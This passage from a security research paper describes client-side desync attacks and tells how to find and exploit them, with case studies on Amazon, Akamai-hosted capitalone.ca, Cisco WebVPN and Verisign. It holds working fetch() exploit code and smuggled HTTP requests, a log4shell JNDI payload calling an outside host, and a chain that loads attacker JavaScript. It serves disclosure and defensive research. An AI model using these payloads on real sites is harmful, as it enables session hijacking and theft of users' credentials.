I conﬁrmed this vulnerability by creating a simple proof of concept (PoC) that stored13 random live users' complete
requests, including authentication tokens, in my shopping list:
After I reported this to Amazon, I realised that I'd made a terrible mistake and missed out on a much cooler potential
exploit. The attack request was so vanilla that I could have made anyone's web browser issue it using fetch(). By using
the HEAD technique on Amazon to create an XSS gadget and execute JavaScript in victim's browsers, I could have made
each infected victim re-launch the attack themselves, spreading it to numerous others. This would have released a desync
worm - a self-replicating attack which exploits victims to infect others with no user-interaction, rapidly exploiting every
active user on Amazon.
I wouldn't advise attempting this on a production system, but it could be fun to try on a staging environment. Ultimately
this browser-powered desync was a cool ﬁnding, a missed opportunity, and also a hint at a new attack class.
Client-side desync
Traditional desync attacks poison the connection between a front-end and back-end server, and are therefore impossible
on websites that don't use a front-end/back-end architecture. I'll refer to this as a server-side desync from now on. Most
server-side desyncs can only be triggered by a custom HTTP client issuing a malformed request, but, as we just saw on
amazon.com, it is sometimes possible to create a browser-powered server-side desync.
The ability for a browser to cause a desync enables a whole new class of threat I'll call client-side desync (CSD), where
the desync occurs between the browser and the front-end server. This enables exploitation of single-server websites,
which is valuable because they're often spectacularly poor at HTTP parsing.
A CSD attack starts with the victim visiting the attacker's website, which then makes their browser send two cross-
domain requests to the vulnerable website. The ﬁrst request is crafted to desync the browser's connection and make the
second request trigger a harmful response, typically giving the attacker control of the victim's account:
Methodology
When trying to detect and exploit client-side desync vulnerabilities you can reuse many concepts from server-side desync
attacks. The primary difference is that the entire exploit sequence occurs in your victim's web browser, an environment
signiﬁcantly more complex and uncontrolled than a dedicated hacking tool. This creates some new challenges, which
caused me quite a lot of pain while researching this technique. To spare you, I've taken the lessons learned and developed
the following methodology. At a high level, it may look familiar:
Detect
The ﬁrst step is to identify your CSD vector. This basic primitive is the core of the vulnerability, and the platform on
which the exploit will be built. We have implemented automated detection of these in both HTTP Request Smuggler and
Burp Scanner, but an understanding of how to do it manually is still valuable.
A CSD vector is a HTTP request with two key properties.
First, the server must ignore the request's Content-Length (CL). This typically happens because the request either
triggered a server error, or the server simply wasn't expecting a POST request to the chosen endpoint. Try targeting static
ﬁles and server-level redirects, and triggering errors via overlong-URLs, and semi-malformed ones like /%2e%2e.
Secondly, the request must be triggerable in a web-browser cross-domain. Browsers severely restrict control over cross-
domain requests, so you have limited control over headers, and if your request has a body you'll need to use the HTTP
POST method. Ultimately you only control the URL, plus a few odds and ends like the Referer header, the body, and
latter part of the Content-Type:
POST /favicon.ico HTTP/1.1 
Host: example.com 
Referer: https://attacker.net/?%00 
Content-Type: text/plain; charset=null, boundary=x 
Now we've composed our attack request, we need to check whether the server ignores the CL. As a simple ﬁrst step,
issue the request with an over-long CL and see if the server still replies:
POST /favicon.ico 
Host: example.com 
Content-Length: 5 
X 
HTTP/1.1 200 OK 
This is promising, but unfortunately some secure servers respond without waiting for the body so you'll encounter some
false positives. Other servers don't handle the CL correctly, but close every connection immediately after responding,
making them unexploitable. To ﬁlter these out, send two requests down the same connection and look for the body of the
ﬁrst affecting the response to the second:
POST /favicon.ico 
Host: example.com 
Content-Length: 23 
GET /404 HTTP/1.1 
X: YGET / HTTP/1.1 
Host: example.com 
HTTP/1.1 200 OK 
HTTP/1.1 404 Not Found 
To test this in Burp Suite, place the two requests into a tab group in Repeater, then use Send Sequence over Single
Connection. You can also achieve this in Turbo Intruder by disabling pipelining and setting concurrentConnections and
requestsPerConnection to 1 and 100 respectively.
If this works, try altering the body and conﬁrming the second response changes as expected. This simple step is designed
to conﬁrm that your mental model of what's happening matches reality. I personally wasted a lot of time on a system
running Citrix Web VPN, only to realise it simply issued two HTTP responses for each request sent to a certain endpoint.
Finally, it's important to note whether the target website supports HTTP/2. CSD attacks typically exploit HTTP/1.1
connection reuse and web browsers prefer to use HTTP/2 whenever possible, so if the target website supports HTTP/2
your attacks are unlikely to work. There's one exception; some forward proxies don't support HTTP/2 so you can exploit
anyone using them. This includes corporate proxies, certain intrusive VPNs and even some security tools.
Conﬁrm
Now we've found our CSD vector, we need to rule out any potential errors by replicating the behaviour inside a real
browser. I recommend using Chrome as it has the best developer tools for crafting CSD exploits.
First, select a site to launch the attack from. This site must be accessed over HTTPS and located on a different domain
than the target.
Next, ensure that you don't have a proxy conﬁgured, then browse to your attack site. Open the developer tools and switch
to the Network tab. To help with debugging potential issues later, I recommend making the following adjustments:
Select the "Preserve log" checkbox.
Right-click on the column headers and enable the "Connection ID" column.
Switch to the developer console and execute JavaScript to replicate your attack sequence using fetch(). This may look
something like:
fetch('https://example.com/', { 
method: 'POST', 
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix 
mode: 'no-cors', // ensure connection ID is visible 
credentials: 'include' // poison 'with-cookies' pool 
}).then(() => { 
location = 'https://example.com/' // use the poisoned connection 
})
I've set the fetch mode 'no-cors' to ensure Chrome displays the connection ID in the Network tab. I've also set credentials:
'include' as Chrome has two separate connection pools14 - one for requests with cookies and one for requests without.
You'll usually want to exploit navigations, and those use the 'with-cookies' pool, so it's worth getting into the habit of
always poisoning that pool.
When you execute this, you should see two requests in the Network tab with the same connection ID, and the second one
should trigger a 404:
If this works as expected, congratulations - you've found yourself a client-side desync!
Explore
Now we've got a conﬁrmed client-side desync, the next step is to ﬁnd a gadget that we can use to exploit it. Triggering an
unexpected 404 in the Network tab might impress some, but it's unlikely to yield any user passwords or bounties.
At this point we have established that we can poison the victim browser's connection pool and apply an arbitrary preﬁx to
an HTTP request of our choice. This is a very powerful primitive which offers three broad avenues of attack.
Store
One option is to identify functionality on the target site that lets you store text data, and craft the preﬁx so that your
victim's cookies, authentication headers, or password end up being stored somewhere you can retrieve them. This attack
ﬂow works almost identically to server-side request smuggling15, so I won't dwell on it.
Chain&pivot
The next option is all-new, courtesy of our new attack platform in the victim's browser.
Under normal circumstances, many classes of server-side attack can only be launched by an attacker with direct access to
the target website as they rely on HTTP requests that browsers refuse to send. This includes virtually all attacks that
involve tampering with HTTP headers - web cache poisoning, most server-side request smuggling, host-header attacks,
User-Agent based SQLi, and numerous others.
For example, it's not possible to make someone else's browser issue the following request with a log4shell payload in the
User-Agent header:
GET / HTTP/1.1 
Host: intranet.example.com 
User-Agent: ${jndi:ldap://x.oastify.com}
CSD vulnerabilities open a gateway for these attacks on websites that are otherwise protected due to being located on
trusted intranets or hidden behind IP-based restrictions. For example, if intranet.example.com is vulnerable to CSD, you
might achieve the same effect with the following request, which can be triggered in a browser with fetch():
POST /robots.txt HTTP/1.1 
Host: intranet.example.com 
User-Agent: Mozilla/5.0 etc 
Content-Length: 85 
GET / HTTP/1.1 
Host: intranet.example.com 
User-Agent: ${jndi:ldap://x.oastify.com} 
It's a good job Chrome is working on mitigations against attacks on intranet websites, as I dread to think how many IoT
devices are vulnerable to CSD attacks.
You can also take advantage of ambient authority like session cookies, hitting post-authentication attack surface in a
CSRF-style attack that's usually impossible due to unforgeable headers, such as a JSON Content-Type. Overall, CSD
vulnerabilities are exceptionally well suited to chaining with both client-side and server-side ﬂaws, and may enable
multi-step pivots in the right circumstances.
Attack
The ﬁnal option is using the malicious preﬁx to elicit a harmful response from the server, typically with the goal of
getting arbitrary JavaScript execution on the vulnerable website, and hijacking the user's session or password.
I found that the simplest path to a successful attack came from two key techniques usually used for server-side desync
attacks: JavaScript resource poisoning via Host-header redirects16, and using the HEAD method17 to splice together a
response with harmful HTML. Both techniques needed to be adapted to overcome some novel challenges associated with
operating in the victim's browser. In the next section, I'll use some case studies to explore these obstacles and show how
to handle them.
Case studies
By automating detection of CSD vulnerabilities then scanning my bug bounty pipeline, I identiﬁed a range of real
vulnerable websites. In this section, I'll take a look at four of the more interesting ones, and see how the methodology
plays out.
Akamai - stacked HEAD
For our ﬁrst case study, we'll exploit a straightforward vulnerability affecting many websites built on Akamai. As an
example target, I'll use www.capitalone.ca.
When Akamai issues a redirect, it ignores the request's Content-Length header and leaves any message body on the
TCP/TLS socket. Capitalone.ca uses Akamai to redirect requests for /assets to /assets/, so we can trigger a CSD by
issuing a POST request to that endpoint:
fetch('https://www.capitalone.ca/assets', {method: 'POST', body: "GET
/robots.txt HTTP/1.1\r\nX: Y", mode: 'no-cors', credentials: 'include'} )
POST /assets HTTP/1.1 
Host: www.capitalone.ca 
Content-Length: 30 
GET /robots.txt HTTP/1.1 
X: YGET /assets/ HTTP/1.1 
Host: www.capitalone.ca 
HTTP/1.1 301 Moved Permanently 
Location: /assets/  
HTTP/1.1 200 OK 
Allow: /  
To build an exploit, we'll use the HEAD method to combine a set of HTTP headers with a Content-Type of text/html and
a 'body' made of headers that reﬂect the query string in the Location header:
POST /assets HTTP/1.1 
Host: www.capitalone.ca 
Content-Length: 67 
HEAD /404/?cb=123 HTTP/1.1 
GET /x?evil() HTTP/1.1 
X: YGET / HTTP/1.1 
Host: www.capitalone.ca 
HTTP/1.1 301 Moved Permanently 
Location: /assets/  
HTTP/1.1 404 Not Found 
Content-Type: text/html 
Content-Length: 432837 
HTTP/1.1 301 Moved Permanently 
Location: /x/?evil() 
If this was a server-side desync attack, we could stop here. However, there are two complications we'll need to resolve
for a successful client-side desync.
The ﬁrst problem is the initial redirect response. To make the injected JavaScript execute, we need the victim's browser to
render the response as HTML, but the 301 redirect will be automatically followed by the browser, breaking the attack. A
simple solution is to specify mode: 'cors', which intentionally triggers a CORS error. This prevents the browser from
following the redirect and enables us to resume the attack sequence simply by invoking catch() instead of then(). Inside
the catch block, we'll then trigger a browser navigation using location = 'https://www.capitalone.ca/'. It might be tempting
to use an iframe for this navigation instead, but this would expose us to cross-site attack mitigations like same-site
cookies.
The second complication is something called the 'stacked-response problem'. Browsers have a mechanism where if they
receive more response data than expected, they discard the connection. This drastically affects the reliability of
techniques where you queue up multiple responses, such as the HEAD approach that we're using here. To solve this, we
need to delay the 404 response to the HEAD request. Fortunately, on this target we can easily achieve that by adding a
parameter with a random value to act as a cache-buster, triggering a cache miss and incurring a ~500ms delay. Here's the
ﬁnal exploit:
fetch('https://www.capitalone.ca/assets', { 
    method: 'POST', 
    // use a cache-buster to delay the response 
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost:
www.capitalone.ca\r\n\r\nGET /x?x= HTTP/1.1\r\nX:
Y`, 
    credentials: 'include', 
    mode: 'cors' // throw an error instead of following redirect 
}).catch(() => { 
    location = 'https://www.capitalone.ca/' 
})
I reported this to Akamai on 2021-11-03, and I'm not sure when it was ﬁxed.
Cisco Web VPN - client-side cache poisoning
Our next target is Cisco ASA WebVPN which helpfully ignores the Content-Length on almost all endpoints, so we can
trigger a desync simply by issuing a POST request to the homepage. To exploit it, we'll use a Host-header redirect
gadget:
GET /+webvpn+/ HTTP/1.1 
Host: psres.net 
HTTP/1.1 301 Moved Permanently 
Location:
https://psres.net/+webvpn+/index.html
The simplest attack would be to poison a socket with this redirect, navigate the victim to /+CSCOE+/logon.html and
hope that the browser tries to import /+CSCOE+/win.js using the poisoned socket, gets redirected, and ends up importing
malicious JS from our site. Unfortunately this is extremely unreliable as the browser is likely to use the poisoned socket
for the initial navigation instead. To avoid this problem, we'll perform a client-side cache poisoning attack.
First, we poison the socket with our redirect, then navigate the browser directly to /+CSCOE+/win.js:
fetch('https://redacted/', {method: 'POST', body: "GET /+webvpn+/
HTTP/1.1\r\nHost: x.psres.net\r\nX: Y", credentials: 'include'}).catch(() =>
{ location='https://redacted/+CSCOE+/win.js' })
Note that this top-level navigation is essential for bypassing cache partitioning - attempting to use fetch() will poison the
wrong cache.
The browser will use the poisoned socket, receive the malicious redirect, and save it in its local cache for
https:/redacted/+CSCOE+/win.js. Then, it'll follow the redirect and land back on our site at
https://psres.net/+webvpn+/index.html. We'll redirect the browser onward to the login page at
https://redacted/+CSCOE+/logon.html
When the browser starts to render the login page it'll attempt to import /+CSCOE+/win.js and discover that it already has
this saved in its cache. The resource load will follow the cached redirect and issue a second request to
https://psres.net/+webvpn+/index.html. At this point our server can respond with some malicious JavaScript, which will
be executed in the context of the target site.
For this attack to work, the attacker's website needs to serve up both a redirect and malicious JS on the same endpoint. I
took a lazy approach and solved this with a JS/HTML polyglot - Chrome doesn't seem to mind the incorrect Content-
Type:
HTTP/1.1 200 OK 
Content-Type: text/html 
alert('oh dear')/**/
I reported this to Cisco on 2011-11-10, and eventually on 2022-03-02 they declared that they wouldn't ﬁx it due to the
product being deprecated, but would still register CVE-2022-2071318 for it.
Verisign - fragmented chunk
When looking for desync vectors, sometimes it's good to go beyond probing valid endpoints, and instead give the server
some encouragement to hit an unusual code path. While experimenting with semi-malformed URLs like /..%2f, I
discovered that I could trigger a CSD on verisign.com simply by POSTing to /%2f.
I initially attempted to use a HEAD-based approach, similar to the one used earlier on Akamai. Unfortunately, this
approach relies on a Content-Length based response, and the server sent chunked responses to all requests that didn't
have a body. Furthermore, it rejected HEAD requests containing a Content-Length. Eventually, after extensive testing, I
discovered that the server would issue a CL-based response for HEAD requests provided they used Transfer-Encoding:
chunked.